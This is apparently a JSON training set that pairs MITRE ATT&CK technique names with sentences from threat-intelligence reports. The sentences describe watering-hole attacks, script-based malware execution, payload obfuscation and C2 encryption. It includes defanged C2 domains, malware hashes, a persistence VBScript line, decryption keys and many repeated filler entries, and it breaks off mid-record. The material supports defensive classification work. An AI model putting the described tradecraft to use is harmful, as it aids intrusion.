{
  "drive-by compromise": [
    "From these reports, we know that the group uses an abundance of tools and tactics, ranging across zero-day exploits targeting common applications such as Java or Microsoft Office, heavy use of spear-phishing attacks, compromising legitimate websites to stage watering-hole attacks, and targeting over a variety of operating systems \u2013 Windows, OSX, Linux, even mobile iOS",
    "We believe this access was abused, for example, by inserting malicious scripts in the country\u2019s official websites in order to conduct watering hole attacks",
    "What does the resulting watering hole look like? The websites were compromised to redirect visitors to instances of both ScanBox and BEeF",
    "This targeting of third party organizations to attack further targets is a risky move on the attackers\u2019 part, as it potentially reveals their activity within the compromised third party organizations to the new target (those receiving the malicious documents  Making sense of MuddyWater When we looked at the cluster of activity which consisted of what appeared to be espionage-focused attacks in the Middle East, we were somewhat confused as the previous public reporting had attributed these attacks to FIN7",
    "Online news outlets and general websites were breached and weaponized as a vehicle for watering hole attacks",
    "Malefactors used watering hole attacks to compromise legitimate and trusted websites frequently visited by their targets",
    "The payload delivered in these November 2017 attacks using DDE enabled documents was SofacyCarberp, which differs from the Zebrocy downloader delivered in the February 2018 attacks",
    "Like many threat groups, TG-3390 conducts strategic web compromises (SWCs), also known as watering hole attacks, on websites associated with the target organization's vertical or demographic to increase the likelihood of finding victims with relevant information",
    "[2] Threat groups use strategic web compromises (SWCs), also known as watering hole attacks, to target a wide array of potential victims",
    "Threat actors compromise a website used by their target demographic (e.g., compromising a website specializing in oil and gas industry news when targeting the energy vertical)",
    "Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring [Application Access Token](https://attack.mitre.org/techniques/T1550/001).\n\nMultiple ways of delivering exploit code to a browser exist, including:\n\n* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.\n* Malicious ads are paid for and served through legitimate ad providers.\n* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\n\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Shadowserver Strategic Web Compromise)\n\nTypical drive-by compromise process:\n\n1. A user visits a website that is used to host the adversary controlled content.\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. \n    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.\n    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.\n\nUnlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\n\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.(Citation: Volexity OceanLotus Nov 2017)"
  ],
  "system information discovery new service service execution-multi": {
    "technique_names": [
      "system information discovery",
      "create or modify system process",
      "system services: service execution"
    ],
    "sentances": [
      "Summary information for the three binaries we analyzed follows:    MD5 364ff454dcf00420cff13a57bcb78467   SHA-256 8bca0031f3b691421cb15f9c6e71ce19335 5d2d8cf2b190438b6962761d0c6bb   ssdeep 3072:n+1R4tREtGN4qyGCXdHPYK9l0H786 O26BmMAwyWMn/qwwiHNl:n+1R43QcIL XdF0w6IBmMAwwCwwi   Size 141.2 KB (144560 bytes)   Type ELF 64-bit (stripped)   Install as root /bin/rsyncd   Root install desc synchronize and backup service   Install as non-root ~/.config/dbus-notifier/dbus-inotifier   Non-root install desc system service d-bus notifier   C2 azureon-line[.]com (TCP/80)   Usage Timeframe Late 2014    Table 1: Sample 1 \u2013 Late 2014 Sofacy 64-bit Fysbis    MD5 075b6695ab63f36af65f7ffd45cccd39   SHA-256 02c7cf55fd5c5809ce2dce56085ba43795f2 480423a4256537bfdfda0df85592   ssdeep 3072:9ZAxHANuat3WWFY9nqjwbuZf454U NqRpROIDLHaSeWb3LGmPTrIW33HxIajF: 9ZAxHANJAvbuZf454UN+rv eQLZPTrV3Z   Size 175.9 KB (180148 bytes)   Type ELF 32-bit (stripped)   Install as root /bin/ksysdefd   Root install desc system kernel service defender   Install as non-root ~/.config/ksysdef/ksysdefd   Non-root install desc system kernel service defender   C2 198.105.125[.]74 (TCP/80)   Usage Timeframe Early 2015    Table 2: Sample 2 \u2013 Early 2015 Sofacy 32-bit Fysbis    MD5 e107c5c84ded6cd9391aede7f04d64c8   SHA-256 fd8b2ea9a2e8a67e4cb3904b49c789d57ed 9b1ce5bebfe54fe3d98214d6a0f61   ssdeep 6144:W/D5tpLWtr91gmaVy+mdckn6BCUd c4mLc2B9:4D5Lqgkcj+   Size 314.4 KB (321902 bytes)   Type ELF 64-bit (not stripped)   Install as root /bin/ksysdefd   Root install desc system kernel service defender   Install as non-root ~/.config/ksysdef/ksysdefd   Non-root install desc system kernel service defender   C2 mozilla-plugins[.]com (TCP/80)   Usage Timeframe Late 2015    Table 3: Sample 3 \u2013 Late 2015 Sofacy 64-bit Fysbis Overall, these binaries are assessed as low sophistication, but effective",
      "Once Shellex is called, it first passes each of the items in the config buffer to their own strings.\u00a0 Next, it creates a mutex using the filename and checks to see if the Service key for the service name exists.\u00a0 If so, it opens it using service manager.\u00a0 If not, it first saves a copy of itself to %Program Files (x86)%/DIFXE/svchost.exe.\u00a0 Next, it creates the service and runs it.\u00a0 Once the service is running, it creates a new mutex using [C2URL]:[PORT] and connects to the C2 server.\u00a0 It then sends the Implant_Heartbeat opcode, and then calls its payload function to grab  Version Information (x86 and x64) Host information SystemInfo Processor Count and Write Speed Global Memory Status  before formatting it, altering the InstallTime subkey, and sending all of the information back to its C2 in the Implant_Login buffer"
    ]
  },
  "command and scripting interpreter": [
    "According to the server\u2019s code, the default command that it would issue to newly infected systems was a batch script contained in a file named 0000000000.bat",
    "Code comparison between the default batch script issued by Poison Frog\u2019s C2 and a batch script received by the Helminth Trojan Webshells The data dump included several different webshells apparently used by OilRig to interact with compromised servers",
    "After execution, the malware will use the Dropbox API to make an HTTP GET request using HTTPS over TCP port 443 for the files:  MD5  Filename  d76261ba3b624933a6ebb5dd73758db4  WmiApCom  79b68cdd0044edd4fbf8067b22878644  WmiApCom.bat   The \u201cWmiApCom.bat\u201d file is simply used to start \u201cWmiApCom\u201d, which happens to be the exact same file as the one dropped by the malicious Word documents",
    "Attackers using Comnie are leveraging malicious macros that initially hide decoy documents and shows them when the victim enables macros",
    "Comnie allows the attacker to provide and subsequently execute a batch script (BAT), executable file (EXE), or dynamic-link library (DLL)",
    "While all payloads can be dynamically updated, at the time of delivery, this task launched a COM scriptlet (\u201c.sct\u201d file extension) that downloaded and executed Meterpreter hosted on images.chinabytes[.]info",
    "VBScript #1 The dropped script \u201c58d2a83f7778d5.36783181.vbs\u201d acts as a launcher",
    "When, finally, the first stage shellcode receives a special \u201cFF\u201d signal, it then executes the delivered shellcode",
    "For example, they stated DROPSHOT uses more advanced anti-emulation techniques, utilizes external scripts for self-deletion, and uses memory injection versus external drivers for deployment",
    "The following are the three files:   Defender.sct \u2013 The malicious JavaScript based scriptlet file",
    "Users can protect themselves from such attacks by disabling Office macros in their settings and also by being more vigilant when enabling macros (especially when prompted) in documents, even if such documents are from seemingly trusted sources",
    "While we have not been able to obtain a secondary payload from the Unicorn generated PowerShell script, we believe that this group uses the script to deliver Metasploit\u2019s Meterpreter as a potential payload as well",
    "Specifically, we discovered code in the PowerShell script that was a match for code in Magic Unicorn containing the comment \u201cone line shellcode injection with native x86 shellcode\u201d",
    "bat: A batch file to set up the service COMSysApp, for an x64 system bat: A batch file to set up the service COMSysApp, for an x86 system ini: A data file with Base64-encoded data for connecting to an FTP server",
    "Via WMI (winmgmt), the JavaScript or VBscript code in the SCT file spawns a PowerShell one-liner which finally consumes the text file",
    "Character  Description  0  File contains batch commands, it executes the batch commands  1  Rename the temporary file as .ps1 extension  2  Rename the temporary file as .vbs extension   Table 2: BONDUPDATER Actions Figure 8 is a screenshot of BONDUPDATER\u2019s DGA implementation",
    "To run persistently on the system, the Trojan will first create a VBScript file:SpecialFolder.CommonApplicationData\\srvResesponded.vbs that contains:CreateObject(\u201cWScript.Shell\u201d).Run(\u201c%app%\u201d) The Trojan replaces the %app% string in the above VBScript with the path to its executable",
    "The group often uses the trial version of Cobalt Strike, a publicly available commercial software for \u201cAdversary Simulations and Red Team Operations.\u201d Other public tools used by the group are Metasploit, a well-known free and open source framework for developing and executing exploit code against a remote target machine; Mimikatz, a post-exploitation tool that performs credential dumping; and Empire, \u201ca PowerShell and Python post-exploitation agent.\u201d For detection and exploitation of internet-facing web servers, CopyKittens use Havij, Acunetix and sqlmap",
    "The second file is a PowerShell script which appears to be based on a Rapid7 Ruby Exploitation script that loads arbitrary shellcode",
    "Next, it will copy the first stage shellcode in memory and create a new thread with the shellcode running in it, the code responsible for this execution is shown in Figure 1",
    "For that we can use a Python script, included in Appendix B \u2013 Python Scripts",
    "However, in order to kick off the execution of the malware the attacker uses a batch script which executes the malware, but the batch script does more than simply initiate execution of the malware",
    "The full contents of the batch script are given in Appendix C \u2013 a.bat",
    "Essentially, we are discussing ongoing activity revolving around several malware families:  KopiLuwak and IcedCoffeer Carbon Mosquito WhiteBear  Technical Rattle Turla\u2019s Shifting to Scripting KopiLuwak and IcedCoffee, WhiteBear, and WhiteAtlas Since at least 2015 Turla has leveraged Javascript, powershell, and wsh in a number of ways, including in their malware dropper/installation operations as well as for implementing complete backdoors",
    "The image is downloaded directly, and the shellcode is loaded and executed in memory",
    "(On the left is NavRAT, and on the right is the shellcode of ROKRAT):    We performed the same analysis for the shellcode located in the downloaded image file and the shellcode is not exactly the same, but the design is very similar",
    "Figure 3: Script code embedded in 29[.]html used to download and run Revenge RAT The script shown in Figure 4 is almost identical to the one used by the script contents of 29[.]html (in Figure 3), the only difference being the absence of a sleep command and the usage of the \u201cforfiles\u201d utility",
    "The downloaded document template contains the malicious macro codes, which executes a VBScript (VBS).",
    "The attackers typically distribute Netwalker ransomware with the use of a reflective PowerShell loader script that has been protected from casual analysis with several layers of obfuscation.",
    "The attackers orchestrate attacks using batch or PowerShell scripts that are executed, with the help of domain controllers, on any machine the DC can reach.",
    "So this method uses psexec itself to copy the payload over the network, overwrite earlier versions (if found), and run it without waiting for any response. They use batch files that leverage psexec , again, to push PowerShell loader scripts out to machines the network scanner finds on the internal network.",
    "",
    "The files uploaded to this webshell included the same compiled python script that would scan remote systems that were vulnerable to CVE-2017-0144 (EternalBlue) that we saw uploaded to the other errr.aspx webshell.",
    "",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    "Javascript ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " PowerShell ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " VBScript ",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    " Python",
    "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nThere are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)"
  ],
  "obfuscated files or information": [
    "Figure 2: Sofacy Fysbis capability related leakage through strings Figure 2 shows interactive status / feedback strings that can give a defender an initial profile of capabilities",
    "For comparison, if we were to inspect Fysbis \u201cRemoteShell\u201d associated strings in one of the stripped variants, we would only see the following:  Figure 3: Sofacy Fysbis stripped binary string references to RemoteShell capability Compare this with what is available from the non-stripped variant:  Figure 4: Sofacy Fysbis non-stripped binary strings referenes to RemoteShell capability Little static analysis gifts like these can help to speed defender enumeration of capabilities and \u2013 more importantly \u2013 further contribute to correlation and detection across related samples",
    "That malicious dll then loads encrypted shellcode from the binary, which is decrypted and runs the final BUGJUICE payload",
    "Messages are encrypted using AES with a static key",
    "The 2.0 versions require a dropper to decipher and launch the AES encrypted QUASARRAT payload",
    "After the payload is launched, the shellcode runs the following commands to prevent Microsoft Word from showing a recovery dialog:   Lastly, the shellcode overwrites the malicious file with a decoy document related to the Indian defense forces\u2019 pay scale / matrix (Figure 3), displays it to the user and terminates the exploited instance of Microsoft Word",
    "The code is obfuscated in order to hide any malicious activity on the remote server",
    "Bxaki obfuscated function",
    "This strangeness\u00a0was related to values listed in newer\u00a0BlackEnergy configuration files",
    "Evidence also supports the hypothesis that there is a encryption plugin for victim files (see below)",
    "Destructive dstr command in BE2 config file Also, on some machines, documents were encrypted, but no related\u00a0plugin could be\u00a0found",
    "It is prepended to the encrypted and encoded message",
    "The headers are XOR encrypted with <hdrXORKey1> and <hdrXORKey2> combined and reversed",
    "Build Tool Most of CARBANAK\u2019s strings are encrypted in order to make analysis more difficult",
    "This build tool encrypts the binary\u2019s strings with a fresh key for each build",
    "Tool Type Internal Name Industry Name   Backdoor Poison Frog BONDUPDATER   Backdoor Glimpse Updated BONDUPDATER   Webshell HyperShell TwoFace loader   Webshell HighShell TwoFace payload   Webshell Minion TwoFace payload variant   DNS Hijacking Toolkit webmask Related to DNSpionage     Table 1",
    "The HyperShell and HighShell webshells are variants of what we track as TwoFace, with HyperShell being related to the TwoFace loader and HighShell being related to the TwoFace payload, as we reported in July 2017",
    "Encryption consists of XOR with a hardcoded key for its configuration and RC4 with a predefined password for encrypting the victim\u2019s data",
    "Configuration Config.ini is the file where the malware stores its encrypted configuration data",
    "These requests are encrypted using the RC4 algorithm",
    "While performing the analysis on the delivery documents using the .sct file AppLocker bypass, we noticed the C# payload was functionally similar to the original RogueRobin payload",
    "Figure 3 Targeted lure content In one of the documents, the victim is presented with what appears to be an obfuscated document with the NATO EOD seal and text alluding to the targeted nation state",
    "The group clearly shows a preference for using a simple downloader like Zebrocy as first-stage payloads in these attacks",
    "APT29 wrote the encrypted and base64-encoded PowerShell backdoor code into that property",
    "When we converted the dates in the file strings from the Solar Hijri calendar to the Gregorian one, we found that they were close to the compilation times of the executables and also close to when Cadelle\u2019s targets were initially compromised",
    "WindowsDefender.ini \u2013 The Base64 encoded and obfuscated PowerShell script",
    "Some of the key obfuscation techniques used are:   Character Replacement: Several instances of character replacement and string reversing techniques (Figure 10) make analysis difficult",
    "Figure 3: The first step of decryption will perform XOR on one byte using the previous adjacent byte, starting from the last byte and excluding the first byte  Figure 4: The second step uses RC4, using the first 0x20 bytes from the result of the first step as the RC4 key  Figure 5: Encrypted (Top) and decrypted (bottom) configuration file It is also important to note that while the loader component and the configuration file are located in the same directory (%windows%\\system32), the encrypted backdoor is located in a different directory (%Program Files%\\Common Files\\System\\ado)",
    "All strings used by the Trojan are encrypted with the XOR algorithm",
    "Next, the buffer is encrypted using the RC4 algorithm with the 50-byte key (also stored in the backdoor\u2019s body)",
    "11 bytes of this buffer are encrypted with the XOR algorithm as follows: i = 0 while ( 1 ) {   crypted_buffer = (_BYTE *)this_->crypted_buffer;   if ( i gt;= this-gt;crypted_buffer_size - 4 ) // this-gt;crypted_buffer_size == 15     break;   ++i;   crypted_buffer[i + 4] ^= crypted_buffer[i & 3];  The generated buffer in encoded using the BASE64 alphabet, where the last two characters are replaced with \u201c-\u201d and \u201c_\u201d",
    "Next, to the beginning of the BASE64 string a random BASE64 string with the length of 5 characters is added",
    "The first 11 bytes of the received buffer are encrypted with the XOR algorithm",
    "Once it is encrypted using the XOR algorithm, the buffer is encoded with BASE64",
    "The launcher module, obfuscated with the notorious Metasploit\u2019s shikata_ga_nai encoder, is the same for all the droppers",
    "These redirects were implemented by adding two malicious scripts obfuscated by a tool similar to the Dean Edwards packer",
    "Many of the Fetch samples we analyzed attempted to obfuscate their functionality by encrypting their embedded strings using AES",
    "Although the activity was previously linked by others to the FIN7 threat actor group, our research suggests the activity is in fact espionage related and unlikely to be FIN7 related",
    "Specifically, the following GitHub repositories appear to be controlled by the MuddyWater threat actor(s):  [unknown SHA256]  Downloads payload from: hxxps://raw.githubusercontent[.]com/F0R3X/BrowserFontArabic/master/ArabicBrowserFont.exe   [unknown SHA256]  Downloads payload from: hxxps://raw.githubusercontent[.]com/F0R3X/BrowserFontArabic/master/FontArabic.exe     9b5e36bb7518a9e333c31d09b589102f89e3425571dd434820ab3c437dc4e0d9 (and several others)  Downloads payload from: hxxps://raw.githubusercontent[.]com/ReactDeveloper2017/react/master/src/test/test.js    Interestingly, both profiles were populated with forked repositories to give them an air of legitimacy as shown in figure 2",
    "The domain names differed but the script adheres to the same logic (including the logic function).\u201d The DNSMessenger malware is an obfuscated and customized version of the popular DNS_TXT_PWNAGE.ps1 script available on GitHub and is also referred to by FireEye as POWERSOURCE",
    "Malicious obfuscated VBA code is executed when the macro is first enabled",
    "The current version, HawkEye Reborn v9 has been modified from earlier versions and heavily obfuscated to make analysis more difficult.The email campaigns that have been observed feature characteristics that are consistent with what is commonly seen with malspam campaigns, with the emails purporting to be associated with various documents such as invoices, bills of materials, order confirmations, and other corporate functions",
    "After decompiling it from the PE file, it is heavily obfuscated and still almost unreadable.We deobfuscated the script to understand how the infection process works",
    "The AutoIT script is offering a lot of other functions which are not used in this campaign, like anti-virtual machine detection, USB drive infection and others.The final payload \u2014 which we found in the AutoIT PE file resource section and was started by the process-hollowing shellcode \u2014 is a .NET PE file that's obfuscated with ConfuserEx",
    "In our analysis, the macro is obfuscated, character by character, using the decimal ASCII code",
    "Code snippet of the obfuscated document After deobfuscation, we can see that the payload is written in the Perl programming language",
    "There are two forms of encrypted strings: an RSA256-encrypted string, and custom base64-encoded and RSA256-encrypted string",
    "All strings below are encrypted via AES256 and base64 encoding",
    "Its developer used the open source Invoke-Obfuscation tool to obfuscate this PowerShell script, specifically using the COMPRESS technique offered by Invoke-Obfuscation",
    "At face value, this current variant of OopsIE has a vast majority of its strings obfuscated, which can be deobfuscated by splitting the strings using the hyphen as a delimiter, treating each split value as an integer, subtracting one from each integer and converting each into a character",
    "The Trojan accesses two resources, named Sch and VBS that contains obfuscated strings that contain the command to create the scheduled task and the VBScript to run",
    "A closer examination revealed the obfuscation used by the OilRig group in these QUADAGENT samples were likely the result of using an open-source toolkit called Invoke-Obfuscation",
    "This tool was originally intended to aid defenders in simulating obfuscated PowerShell commands to better their defenses",
    "Invoke-Obfuscation calls the variable obfuscation technique used by the actors to obfuscate this script Random Case + {} + Ticks, which changes all variables in the script to have randomly cased characters, to be surrounded in curly braces and to include the tick (`) character, which is ignored in by PowerShell",
    "Invoke-Obfuscation calls the string obfuscation used by the actors to further obfuscate this script Reorder, which uses the string formatting functionality within PowerShell to reconstruct strings from out of order substrings (ex",
    "By applying two specific obfuscation techniques within Invoke-Obfuscation, we were able to create an obfuscated PowerShell script that was very similar to the QUADAGENT payloads delivered in the attacks discussed in this blog",
    "All the strings and settings were encrypted and obfuscated",
    "The configuration and strings are encrypted using 3DES and Base64 encoding",
    "The C&C server then replies with the encrypted serialized configuration",
    "The shellcode is not encrypted but is obfuscated",
    "Decrypting the Configuration As previously mentioned, the real configuration data is stored in the first stage shellcode but it is not stored in cleartext, but encrypted and compressed",
    "The configuration data is encrypted with the same algorithm described previously by JPCert but using a different XOR value",
    "The configuration blob is encoded using a simple single-byte XOR scheme",
    "KopiLuwak In November 2016, Kaspersky Lab observed a new round of weaponized macro documents that dropped a new, heavily obfuscated Javascript payload that we named KopiLuwak (one of the rarest and most expensive types of coffee in the world)",
    "The payload (abbad7acd\u2026) is an executable that appears to have been created by a VBScript to Executable tool and further obfuscated with a cryptor",
    "Figure 3: no detections for SpeakUp in Virus Total In an attempt to endure the investigation process by security researchers, the second stage payload was encoded with salted base64",
    "Some strings are obfuscated with XOR x56",
    "These files are stored within an 217kb encrypted cab file in the dropper\u2019s resources under the name \u201cA\u201d",
    "The cab file was encrypted and decrypted using a simple xor cipher with a rotating 16 byte key: \\x36\\x11\\xdd\\x08\\xac\\x4b\\x72\\xf8\\x51\\x04\\x68\\x2e\\x3e\\x38\\x64\\x32",
    "This is encrypted by RC4, using the key {0xb5, 0x78, 0x62, 0x52, 0x98, 0x3e, 0x24, 0xd7, 0x3b, 0xc6, 0xee, 0x7c, 0xb9, 0xed, 0x91, 0x62}",
    "We\u2019ve identified two such files: settings.db sdfg3d.db Here\u2019s how such a database file appears:  These are BASE64 encoded and use the same RC4 encryption key as the malware configuration",
    "The CARROTBAT malware family is a somewhat unique dropper and while it supports various types of decoy documents, and employs rudimentary command obfuscation, it should be made clear that it is not sophisticated",
    "Embedded Trojan This Trojan loaded by the first payload contains several embedded executables that it uses to ultimately download and execute a secondary payload, as well as downloading and opening a decoy document",
    "HttpBrowser's executable code may be obfuscated through structured exception handling and return-oriented programming",
    "Navigating to the web page manually to view:source reveals the code, which at the time of writing happened to not be obfuscated in any significant way",
    "All third-party trademarks referenced by Cofense whether in logo form, name form or product form, or otherwise, remain the property of their respective holders, and use of these trademarks in no way indicates any relationship between Cofense and the holders of the trademarks",
    "Figure 7: The same de-obfuscated code as Figure 2 The only other script content of the blog-page[.]html is an empty script section",
    "All third-party trademarks referenced by Cofense whether in logo form, name form or product form, or otherwise, remain the property of their respective holders, and use of these trademarks in no way indicates any relationship between Cofense and the holders of the trademarks",
    "PlayList.vbs contains the obfuscated codes, which it executes after decrypting the obfuscations.",
    "Once executed, Vcrodat loads an encrypted payload on to the victim\u2019s computer.",
    "",
    "Figure 3\u00a0shows this webshell\u2019s code that will run supplied JScript provided in base64 encoded format within the URL within a parameter",
    "",
    "",
    "The file uses a character insertion obfuscation technique, making it appear to contain Chinese characters.",
    "The JavaScript is heavily obfuscated. The first variable\u2014a\u2014is an array of obfuscated values",
    "This shellcode is decrypted in memory through EQENDT32.EXE",
    "The encrypted file contains a config file of 0x78 bytes. The data is decrypted with an 0xD9 XOR operation.",
    "The \"Blackwater.bas\" macro was obfuscated using a substitution cipher whereby the characters are replaced with their corresponding integer.",
    "The actors have made some small changes, such as altering the variable names to avoid Yara detection",
    "To operate and evade standard analysis tools, most of the functions are hashed",
    "Note that every string is decrypted with different XOR parameter which may fail some of the automatic analyzers.",
    "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) "
  ],
  "encrypted channel": [
    "Figure 6: Assembly view of Sample 3 root installation related byte arrays As it turns out, the referenced byte mask is applied to the other byte arrays using a rolling double-XOR algorithm to construct malware installation paths, filenames, and descriptions for a Linux root account",
    "The encryption/decryption routine (refer to Figure 5) can be summarized as follows:      Figure 5: Encryption/ Decryption Function  Generate an array of integers from 0x00 to 0xff Scrambles the state of the table using the given key Encrypts or decrypts a string using the scrambled table from (b)",
    "Version 2 Rather than using the host ID as the key, this version uses a random XOR key between 32 and 64 bytes in length that is generated for each session",
    "A build tool is likely being used by these attackers that allows the operator to configure details such as C2 addresses, C2 encryption keys, and a campaign code",
    "After applying this decryption algorithm, we are presented with the following data: h=HOSTNAME-PC&f=mission.ini&c=& The response made by the C2 server uses the same RC4 key for encryption",
    "The BONDUPDATER script, which was named based on the hard-coded string \u201cB007\u201d, uses a custom DGA algorithm to generate subdomains for communication with the C2 server",
    "Figure 9: Example Network Communication In the example, the POWRUNER client sends a random GET request to the C2 server and the C2 server sends the random number (99999999990) as a response",
    "The structure of each of these outbound DNS requests is as follows: <system ID>-<job ID>-<offset in data><more data flag>-<random length of base64 encoded data between 30 and 42 characters>.<c2 domain> The payload will look for different responses to these outbound queries depending on the type of DNS request that the payload uses to communicate with the C2",
    "The C2 server will provide the pre-shared key within the response data and will provide the session ID value via the Set-Cookie field within the response, specifically the string after the PHPSESSID parameter of the cookie",
    "<encoded system data>.<same random number between 100000 and 999999 above>.<c2 name> \u00a0 After obtaining a session ID and pre-shared key, the PowerShell script will continue to communicate with its C2 server to obtain data to treat as a command",
    "Instead, it immediately issues a query to resolve the following domain, which embeds the session ID value to transmit it to the C2: \u00a0 <encoded session id>.<same random number between 100000 and 999999>.<c2 domain name> \u00a0 To transmit the data via the DNS tunneling, the C2 server will respond to the above query with an IPv6 address that contains the number of DNS queries the payload must issue to obtain the entirety of the data from subsequent IPv6 answers",
    "The script will send the specified number of DNS queries using the following format, each of which the C2 will respond with an IPv6 address that the script will treat as a string of data: \u00a0 www.<sequence number>.<same random number between 100000 and 999999>.<c2 domain name> \u00a0 The payload will treat the data provided by the C2 as a message, which will have the following structure: \u00a0 hello<char uuid[35]><char type[1]><data> \u00a0 The message will start with the string hello followed by a 35-character UUID string",
